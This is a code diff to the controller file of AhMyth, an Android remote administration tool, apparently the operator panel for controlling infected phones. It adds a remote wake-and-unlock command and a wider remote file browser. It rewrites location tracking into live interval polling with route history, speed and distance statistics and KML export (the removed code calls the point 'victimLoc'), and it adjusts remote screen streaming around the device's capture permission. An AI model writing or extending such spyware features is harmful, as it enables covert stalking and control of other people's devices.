@@ -357,6 +357,21 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
         socket.emit(ORDER, { order: permOrder, permission: permissionType });
     };
 
+    // Wake screen function - wakes up device and attempts to unlock
+    $labCtrl.wakeScreen = () => {
+        $rootScope.Log('[→] Sending wake screen command...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: 'x0000wk' });
+    };
+    
+    // Listen for wake response
+    socket.on('x0000wk', (data) => {
+        if (data.success) {
+            $rootScope.Log(`[✓] ${data.message || 'Screen woken up'}`, CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log(`[✗] Wake failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
+        }
+    });
+    
     // Listen for permission request responses
     socket.on('x0000rp', (data) => {
         if (data.success) {
@@ -735,11 +750,31 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         }
     };
 
-    // When folder/file is clicked
-    $fmCtrl.getFiles = (item) => {
-        if (item && item.isDir) {
-            let newPath = item.path || ($fmCtrl.currentPath + '/' + item.name);
-            $fmCtrl.goToPath(newPath);
+    // When folder/file is clicked - handles both path string and file object
+    $fmCtrl.getFiles = (itemOrPath) => {
+        let targetPath;
+        
+        if (typeof itemOrPath === 'string') {
+            // Direct path string (from quick access or breadcrumb)
+            targetPath = itemOrPath;
+        } else if (itemOrPath && typeof itemOrPath === 'object') {
+            // File object
+            if (!itemOrPath.isDir) return; // Only navigate into folders
+            targetPath = itemOrPath.path || ($fmCtrl.currentPath + '/' + itemOrPath.name);
+        } else {
+            return;
+        }
+        
+        if (targetPath) {
+            $fmCtrl.goToPath(targetPath);
+        }
+    };
+    
+    // Open folder - wrapper for consistency
+    $fmCtrl.openFolder = (file) => {
+        if (file && file.isDir) {
+            let targetPath = file.path || ($fmCtrl.currentPath + '/' + file.name);
+            $fmCtrl.goToPath(targetPath);
         }
     };
 
@@ -1098,147 +1133,491 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
 
 //-----------------------Location Controller (location.htm)------------------------
-// Location controller - FIXED
-app.controller("LocCtrl", function ($scope, $rootScope, $timeout) {
-    $LocCtrl = $scope;
+// Location controller - REVAMPED with live tracking, history, routes
+app.controller("LocCtrl", function ($scope, $rootScope, $timeout, $interval) {
+    var $LocCtrl = $scope;
     var location = CONSTANTS.orders.location;
+    
+    // State
     $LocCtrl.currentLocation = null;
     $LocCtrl.lastUpdate = null;
+    $LocCtrl.locationHistory = [];
+    $LocCtrl.isTracking = false;
+    $LocCtrl.activeTab = 'current';
+    $LocCtrl.load = '';
     
+    // Settings
+    $LocCtrl.refreshInterval = 10; // seconds
+    $LocCtrl.showRoute = true;
+    $LocCtrl.showAllMarkers = false;
+    $LocCtrl.showHeatmap = false;
+    $LocCtrl.mapStyle = 'osm';
+    
+    // Stats
+    $LocCtrl.trackingStats = null;
+    
+    // Map objects
     var map = null;
-    var marker = null;
-
+    var currentMarker = null;
+    var routeLine = null;
+    var historyMarkers = [];
+    var tileLayer = null;
+    var trackingInterval = null;
+    var trackingStartTime = null;
+    
+    // Map tile providers (all free, no API key needed)
+    var tileLayers = {
+        osm: {
+            url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
+            options: { maxZoom: 19, subdomains: ['a', 'b', 'c'] }
+        },
+        dark: {
+            url: 'https://tiles.stadiamaps.com/tiles/alidade_smooth_dark/{z}/{x}/{y}{r}.png',
+            attribution: '&copy; <a href="https://stadiamaps.com/">Stadia Maps</a>',
+            options: { maxZoom: 20 }
+        },
+        satellite: {
+            url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
+            attribution: '&copy; <a href="https://www.esri.com/">Esri</a>',
+            options: { maxZoom: 18 }
+        },
+        terrain: {
+            url: 'https://stamen-tiles-{s}.a.ssl.fastly.net/terrain/{z}/{x}/{y}{r}.png',
+            attribution: '&copy; <a href="https://stamen.com/">Stamen Design</a>',
+            options: { maxZoom: 18, subdomains: 'abcd' }
+        }
+    };
+    
+    // Cleanup on destroy
     $LocCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(location);
+        if (trackingInterval) {
+            $interval.cancel(trackingInterval);
+        }
         if (map) {
             map.remove();
             map = null;
         }
     });
 
-    // Initialize map after DOM is ready
+    // Initialize map
     function initMap() {
         $timeout(() => {
             const mapContainer = document.getElementById('mapid');
             if (mapContainer && !map) {
                 try {
-                    // Set explicit dimensions
-                    mapContainer.style.width = '100%';
-                    mapContainer.style.height = '400px';
-                    mapContainer.style.minHeight = '400px';
-                    
-                    // Initialize Leaflet map
                     map = L.map('mapid', {
-                        center: [51.505, -0.09],
+                        center: [40.7128, -74.0060], // Default NYC
                         zoom: 13,
                         zoomControl: true,
                         attributionControl: true
                     });
                     
-                    // Use OpenStreetMap tiles (most reliable, no API key needed)
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
-                        maxZoom: 19,
-                        subdomains: ['a', 'b', 'c']
-                    }).addTo(map);
+                    // Add default tile layer
+                    changeMapStyle('osm');
                     
-                    // Force map to recalculate size multiple times
+                    // Resize handling
                     var resizeMap = function() {
-                        if (map) {
-                            map.invalidateSize(true);
-                        }
+                        if (map) map.invalidateSize(true);
                     };
-                    setTimeout(resizeMap, 100);
-                    setTimeout(resizeMap, 300);
-                    setTimeout(resizeMap, 500);
-                    setTimeout(resizeMap, 1000);
-                    setTimeout(resizeMap, 2000);
-                    
-                    // Also resize on window resize
+                    [100, 300, 500, 1000].forEach(delay => setTimeout(resizeMap, delay));
                     window.addEventListener('resize', resizeMap);
                     
-                    $rootScope.Log('[✓] Map initialized successfully', CONSTANTS.logStatus.SUCCESS);
+                    $rootScope.Log('[✓] Map initialized', CONSTANTS.logStatus.SUCCESS);
                 } catch (e) {
-                    console.error('[AhMyth] Map initialization error:', e);
-                    $rootScope.Log('[✗] Failed to initialize map: ' + e.message, CONSTANTS.logStatus.FAIL);
+                    console.error('[AhMyth] Map error:', e);
+                    $rootScope.Log('[✗] Map failed: ' + e.message, CONSTANTS.logStatus.FAIL);
                 }
             } else if (!mapContainer) {
-                // Retry after a short delay
                 $timeout(initMap, 200);
             }
         }, 100);
     }
-
-    // Initialize map
-    initMap();
-
-    $LocCtrl.Refresh = () => {
-        $LocCtrl.load = 'loading';
-        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
-        socket.emit(ORDER, { order: location });
+    
+    // Change map style
+    function changeMapStyle(style) {
+        if (!map) return;
+        
+        var config = tileLayers[style] || tileLayers.osm;
+        
+        if (tileLayer) {
+            map.removeLayer(tileLayer);
+        }
+        
+        tileLayer = L.tileLayer(config.url, {
+            attribution: config.attribution,
+            ...config.options
+        }).addTo(map);
     }
-
-    // Auto-request location on load
-    $timeout(() => {
+    $LocCtrl.changeMapStyle = () => changeMapStyle($LocCtrl.mapStyle);
+    
+    // Create marker
+    function createMarker(lat, lng, isCurrent = true) {
+        var color = isCurrent ? '#00d4aa' : '#6366f1';
+        var size = isCurrent ? 24 : 12;
+        
+        var icon = L.divIcon({
+            className: 'custom-marker',
+            html: `<div style="
+                width: ${size}px; 
+                height: ${size}px; 
+                background: ${color}; 
+                border: 3px solid #fff; 
+                border-radius: 50%; 
+                box-shadow: 0 0 ${isCurrent ? 15 : 5}px ${color}80;
+                ${isCurrent ? 'animation: pulse-marker 2s infinite;' : ''}
+            "></div>`,
+            iconSize: [size, size],
+            iconAnchor: [size/2, size/2]
+        });
+        
+        return L.marker([lat, lng], { icon: icon });
+    }
+    
+    // Update route line
+    function updateRoute() {
+        if (!map) return;
+        
+        // Remove existing route
+        if (routeLine) {
+            map.removeLayer(routeLine);
+            routeLine = null;
+        }
+        
+        if ($LocCtrl.showRoute && $LocCtrl.locationHistory.length > 1) {
+            var points = $LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]);
+            
+            routeLine = L.polyline(points, {
+                color: '#00d4aa',
+                weight: 3,
+                opacity: 0.8,
+                dashArray: '10, 10',
+                lineJoin: 'round'
+            }).addTo(map);
+        }
+    }
+    $LocCtrl.updateRoute = updateRoute;
+    
+    // Update history markers
+    function updateMarkers() {
+        if (!map) return;
+        
+        // Remove existing history markers
+        historyMarkers.forEach(m => map.removeLayer(m));
+        historyMarkers = [];
+        
+        if ($LocCtrl.showAllMarkers && $LocCtrl.locationHistory.length > 0) {
+            $LocCtrl.locationHistory.forEach((loc, index) => {
+                if (index < $LocCtrl.locationHistory.length - 1) { // Skip current
+                    var marker = createMarker(loc.lat, loc.lng, false);
+                    marker.bindPopup(`
+                        <b>Point #${index + 1}</b><br>
+                        Lat: ${loc.lat.toFixed(6)}<br>
+                        Lng: ${loc.lng.toFixed(6)}<br>
+                        Time: ${loc.time}
+                    `);
+                    marker.addTo(map);
+                    historyMarkers.push(marker);
+                }
+            });
+        }
+    }
+    $LocCtrl.updateMarkers = updateMarkers;
+    
+    // Calculate distance between two points (Haversine formula)
+    function calculateDistance(lat1, lng1, lat2, lng2) {
+        var R = 6371; // Earth's radius in km
+        var dLat = (lat2 - lat1) * Math.PI / 180;
+        var dLng = (lng2 - lng1) * Math.PI / 180;
+        var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                Math.sin(dLng/2) * Math.sin(dLng/2);
+        var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        return R * c;
+    }
+    
+    // Calculate tracking stats
+    function updateStats() {
+        if ($LocCtrl.locationHistory.length < 1) {
+            $LocCtrl.trackingStats = null;
+            return;
+        }
+        
+        var totalDistance = 0;
+        for (var i = 1; i < $LocCtrl.locationHistory.length; i++) {
+            var prev = $LocCtrl.locationHistory[i-1];
+            var curr = $LocCtrl.locationHistory[i];
+            totalDistance += calculateDistance(prev.lat, prev.lng, curr.lat, curr.lng);
+        }
+        
+        var duration = trackingStartTime ? Date.now() - trackingStartTime : 0;
+        var hours = Math.floor(duration / 3600000);
+        var minutes = Math.floor((duration % 3600000) / 60000);
+        var seconds = Math.floor((duration % 60000) / 1000);
+        
+        var avgSpeed = duration > 0 ? (totalDistance / (duration / 3600000)) : 0;
+        
+        $LocCtrl.trackingStats = {
+            totalDistance: totalDistance.toFixed(2),
+            duration: `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`,
+            avgSpeed: avgSpeed.toFixed(1)
+        };
+    }
+    
+    // Refresh location
+    $LocCtrl.refreshLocation = function() {
         $LocCtrl.load = 'loading';
         $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: location });
-    }, 500);
-
+    };
+    
+    // Toggle live tracking
+    $LocCtrl.toggleTracking = function() {
+        if ($LocCtrl.isTracking) {
+            // Stop tracking
+            $LocCtrl.isTracking = false;
+            if (trackingInterval) {
+                $interval.cancel(trackingInterval);
+                trackingInterval = null;
+            }
+            $rootScope.Log('[⏹] Location tracking stopped', CONSTANTS.logStatus.INFO);
+        } else {
+            // Start tracking
+            $LocCtrl.isTracking = true;
+            trackingStartTime = Date.now();
+            $LocCtrl.refreshLocation();
+            
+            trackingInterval = $interval(() => {
+                if ($LocCtrl.isTracking) {
+                    $LocCtrl.refreshLocation();
+                }
+            }, $LocCtrl.refreshInterval * 1000);
+            
+            $rootScope.Log(`[▶] Location tracking started (${$LocCtrl.refreshInterval}s interval)`, CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+    
+    // Toggle route visibility
+    $LocCtrl.toggleRoute = function() {
+        $LocCtrl.showRoute = !$LocCtrl.showRoute;
+        updateRoute();
+    };
+    
+    // Toggle heatmap
+    $LocCtrl.toggleHeatmap = function() {
+        $LocCtrl.showHeatmap = !$LocCtrl.showHeatmap;
+        // Heatmap requires additional Leaflet plugin - simplified version
+        if ($LocCtrl.showHeatmap) {
+            $LocCtrl.showAllMarkers = true;
+            updateMarkers();
+        }
+    };
+    
+    // Center on device
+    $LocCtrl.centerOnDevice = function() {
+        if (map && $LocCtrl.currentLocation) {
+            map.setView([parseFloat($LocCtrl.currentLocation.lat), parseFloat($LocCtrl.currentLocation.lng)], 16);
+        }
+    };
+    
+    // Fit all points
+    $LocCtrl.fitAllPoints = function() {
+        if (map && $LocCtrl.locationHistory.length > 0) {
+            var bounds = L.latLngBounds($LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]));
+            map.fitBounds(bounds, { padding: [30, 30] });
+        }
+    };
+    
+    // Focus on specific location
+    $LocCtrl.focusOnLocation = function(loc) {
+        if (map) {
+            map.setView([loc.lat, loc.lng], 17);
+        }
+    };
+    
+    // Open in Google Maps
+    $LocCtrl.openInGoogleMaps = function() {
+        if ($LocCtrl.currentLocation) {
+            var url = `https://www.google.com/maps?q=${$LocCtrl.currentLocation.lat},${$LocCtrl.currentLocation.lng}`;
+            require('electron').shell.openExternal(url);
+        }
+    };
+    
+    // Copy coordinates
+    $LocCtrl.copyCoordinates = function() {
+        if ($LocCtrl.currentLocation) {
+            var coords = `${$LocCtrl.currentLocation.lat}, ${$LocCtrl.currentLocation.lng}`;
+            require('electron').clipboard.writeText(coords);
+            $rootScope.Log('[✓] Coordinates copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+    
+    // Export history as JSON
+    $LocCtrl.exportHistory = function() {
+        if ($LocCtrl.locationHistory.length === 0) return;
+        
+        var data = {
+            device: originalSocket.deviceId || 'unknown',
+            exportDate: new Date().toISOString(),
+            pointCount: $LocCtrl.locationHistory.length,
+            stats: $LocCtrl.trackingStats,
+            locations: $LocCtrl.locationHistory
+        };
+        
+        var filename = `location-history-${Date.now()}.json`;
+        var filePath = path.join(downloadsPath, filename);
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+        
+        $rootScope.Log(`[✓] History exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
+    };
+    
+    // Export as KML
+    $LocCtrl.exportAsKML = function() {
+        if ($LocCtrl.locationHistory.length === 0) return;
+        
+        var kml = `<?xml version="1.0" encoding="UTF-8"?>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+  <Document>
+    <name>AhMyth Location History</name>
+    <description>Exported on ${new Date().toISOString()}</description>
+    <Style id="trackStyle">
+      <LineStyle>
+        <color>ff00d4aa</color>
+        <width>3</width>
+      </LineStyle>
+      <IconStyle>
+        <Icon><href>http://maps.google.com/mapfiles/kml/shapes/placemark_circle.png</href></Icon>
+      </IconStyle>
+    </Style>
+    <Placemark>
+      <name>Device Route</name>
+      <styleUrl>#trackStyle</styleUrl>
+      <LineString>
+        <coordinates>
+${$LocCtrl.locationHistory.map(loc => `          ${loc.lng},${loc.lat},${loc.altitude || 0}`).join('\n')}
+        </coordinates>
+      </LineString>
+    </Placemark>
+${$LocCtrl.locationHistory.map((loc, i) => `    <Placemark>
+      <name>Point ${i + 1}</name>
+      <description>${loc.time}</description>
+      <styleUrl>#trackStyle</styleUrl>
+      <Point><coordinates>${loc.lng},${loc.lat},${loc.altitude || 0}</coordinates></Point>
+    </Placemark>`).join('\n')}
+  </Document>
+</kml>`;
+        
+        var filename = `location-history-${Date.now()}.kml`;
+        var filePath = path.join(downloadsPath, filename);
+        fs.writeFileSync(filePath, kml);
+        
+        $rootScope.Log(`[✓] KML exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
+    };
+    
+    // Clear history
+    $LocCtrl.clearHistory = function() {
+        $LocCtrl.locationHistory = [];
+        trackingStartTime = null;
+        $LocCtrl.trackingStats = null;
+        
+        historyMarkers.forEach(m => map.removeLayer(m));
+        historyMarkers = [];
+        
+        if (routeLine) {
+            map.removeLayer(routeLine);
+            routeLine = null;
+        }
+        
+        $rootScope.Log('[✓] Location history cleared', CONSTANTS.logStatus.INFO);
+    };
+    
+    // Request permission
+    $LocCtrl.requestPermission = function(type) {
+        socket.emit(ORDER, { order: 'x0000rp', extra: type });
+        $rootScope.Log(`[→] Requesting ${type} permission...`, CONSTANTS.logStatus.INFO);
+    };
+    
+    // Handle location response
     socket.on(location, (data) => {
         $LocCtrl.load = '';
         
         if (data.enable) {
             if (data.lat == 0 && data.lng == 0) {
-                $rootScope.Log('[⚠] Location unavailable, please try again', CONSTANTS.logStatus.WARNING);
+                $rootScope.Log('[⚠] Location unavailable', CONSTANTS.logStatus.WARNING);
             } else {
-                $rootScope.Log(`[✓] Location received: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
+                $rootScope.Log(`[✓] Location: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
                 
-                // Update current location
+                // Update current location with all available data
                 $LocCtrl.currentLocation = {
                     lat: data.lat.toFixed(6),
                     lng: data.lng.toFixed(6),
-                    accuracy: data.accuracy ? `${data.accuracy}m` : null
+                    accuracy: data.accuracy ? Math.round(data.accuracy) + 'm' : null,
+                    altitude: data.altitude ? Math.round(data.altitude) : null,
+                    speed: data.speed ? (data.speed * 3.6).toFixed(1) : null, // m/s to km/h
+                    provider: data.provider || null
                 };
                 $LocCtrl.lastUpdate = new Date().toLocaleTimeString();
                 
-                var victimLoc = new L.LatLng(data.lat, data.lng);
+                // Add to history
+                var historyPoint = {
+                    lat: data.lat,
+                    lng: data.lng,
+                    accuracy: data.accuracy ? Math.round(data.accuracy) : null,
+                    altitude: data.altitude ? Math.round(data.altitude) : null,
+                    speed: data.speed || null,
+                    provider: data.provider || null,
+                    timestamp: Date.now(),
+                    time: new Date().toLocaleTimeString()
+                };
+                $LocCtrl.locationHistory.push(historyPoint);
                 
-                // Wait for map to be ready
+                // Update stats
+                updateStats();
+                
+                // Update map
                 if (map) {
-                    if (!marker) {
-                        // Create custom marker icon
-                        var markerIcon = L.divIcon({
-                            className: 'custom-marker',
-                            html: '<div style="width: 20px; height: 20px; background: #00d4aa; border: 3px solid #fff; border-radius: 50%; box-shadow: 0 0 10px rgba(0,212,170,0.5);"></div>',
-                            iconSize: [20, 20],
-                            iconAnchor: [10, 10]
-                        });
-                        marker = L.marker(victimLoc, { icon: markerIcon }).addTo(map);
-                        marker.bindPopup(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
+                    var latlng = L.latLng(data.lat, data.lng);
+                    
+                    if (!currentMarker) {
+                        currentMarker = createMarker(data.lat, data.lng, true);
+                        currentMarker.addTo(map);
                     } else {
-                        marker.setLatLng(victimLoc).update();
-                        marker.setPopupContent(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
+                        currentMarker.setLatLng(latlng);
                     }
                     
-                    map.setView(victimLoc, 15);
+                    currentMarker.bindPopup(`
+                        <b>Current Location</b><br>
+                        Lat: ${data.lat.toFixed(6)}<br>
+                        Lng: ${data.lng.toFixed(6)}<br>
+                        ${data.accuracy ? `Accuracy: ±${Math.round(data.accuracy)}m<br>` : ''}
+                        ${data.altitude ? `Altitude: ${Math.round(data.altitude)}m<br>` : ''}
+                        ${data.provider ? `Provider: ${data.provider}` : ''}
+                    `);
                     
-                    // Invalidate size to ensure proper rendering
-                    setTimeout(() => {
-                        map.invalidateSize();
-                    }, 100);
+                    map.setView(latlng, map.getZoom() < 14 ? 15 : map.getZoom());
+                    
+                    // Update route and markers
+                    updateRoute();
+                    if ($LocCtrl.showAllMarkers) updateMarkers();
+                    
+                    setTimeout(() => map.invalidateSize(), 100);
                 }
             }
         } else {
-            $rootScope.Log('[✗] Location service is disabled on device', CONSTANTS.logStatus.FAIL);
+            $rootScope.Log('[✗] Location disabled on device', CONSTANTS.logStatus.FAIL);
         }
         
-        if (!$LocCtrl.$$phase) {
-            $LocCtrl.$apply();
-        }
+        if (!$LocCtrl.$$phase) $LocCtrl.$apply();
     });
-
+    
+    // Initialize
+    initMap();
+    
+    // Auto-request on load
+    $timeout(() => {
+        $LocCtrl.refreshLocation();
+    }, 500);
 });
 
 //-----------------------Device Info Controller------------------------
@@ -1467,6 +1846,8 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
     $ScreenCtrl.currentFrame = null;
     $ScreenCtrl.screenInfo = { width: 1080, height: 1920 };
     $ScreenCtrl.permissionRequired = false;
+    $ScreenCtrl.awaitingPermission = false;  // Prevent permission spam
+    $ScreenCtrl.permissionGranted = false;
     $ScreenCtrl.frameCount = 0;
     $ScreenCtrl.lastFrameSize = 0;
     $ScreenCtrl.actualFps = 0;
@@ -1672,17 +2053,24 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
     };
     
     $ScreenCtrl.startStream = () => {
+        // Don't start if permission is still required
+        if ($ScreenCtrl.permissionRequired && !$ScreenCtrl.permissionGranted) {
+            $rootScope.Log('[⚠] Please grant screen capture permission first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+        
         $ScreenCtrl.isLoading = true;
         $ScreenCtrl.frameCount = 0;
+        $ScreenCtrl.awaitingPermission = false;
         fpsCounter = 0;
         $rootScope.Log('[→] Starting remote desktop stream...', CONSTANTS.logStatus.INFO);
         
         // Request first frame
         socket.emit(ORDER, { order: screen, extra: 'capture' });
         
-        // Set up polling for frames
+        // Set up polling for frames - but skip if awaiting permission
         streamInterval = $interval(() => {
-            if ($ScreenCtrl.isStreaming) {
+            if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
                 socket.emit(ORDER, { order: screen, extra: 'capture' });
             }
         }, parseInt($ScreenCtrl.fps));
@@ -1787,12 +2175,31 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         
         if (data.success === false) {
             if (data.permissionRequested) {
-                // Permission dialog was shown on device
-                $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
+                // Permission dialog was shown on device - STOP spamming
+                if (!$ScreenCtrl.awaitingPermission) {
+                    $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
+                }
                 $ScreenCtrl.permissionRequired = true;
+                $ScreenCtrl.awaitingPermission = true;  // Stop sending capture requests
+                $ScreenCtrl.permissionGranted = false;
+                
+                // Stop the stream interval to prevent spam
+                if (streamInterval) {
+                    $interval.cancel(streamInterval);
+                    streamInterval = null;
+                }
             } else if (data.error && data.error.toLowerCase().includes('permission')) {
-                $ScreenCtrl.permissionRequired = true;
-                $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
+                if (!$ScreenCtrl.awaitingPermission) {
+                    $ScreenCtrl.permissionRequired = true;
+                    $ScreenCtrl.awaitingPermission = true;
+                    $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
+                    
+                    // Stop the stream interval
+                    if (streamInterval) {
+                        $interval.cancel(streamInterval);
+                        streamInterval = null;
+                    }
+                }
             } else if (data.error && (data.error.toLowerCase().includes('no image') || data.error.toLowerCase().includes('unavailable'))) {
                 // Don't stop streaming on temporary image errors - just log and continue
                 $rootScope.Log('[⚠] Waiting for screen data...', CONSTANTS.logStatus.WARNING);
@@ -1816,6 +2223,17 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             $ScreenCtrl.frameCount++;
             $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
             $ScreenCtrl.permissionRequired = false;
+            $ScreenCtrl.awaitingPermission = false;
+            $ScreenCtrl.permissionGranted = true;
+            
+            // Restart stream interval if it was stopped due to permission
+            if ($ScreenCtrl.isStreaming && !streamInterval) {
+                streamInterval = $interval(() => {
+                    if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
+                        socket.emit(ORDER, { order: screen, extra: 'capture' });
+                    }
+                }, parseInt($ScreenCtrl.fps));
+            }
             
             // Update screen info from frame
             if (data.width && data.height) {
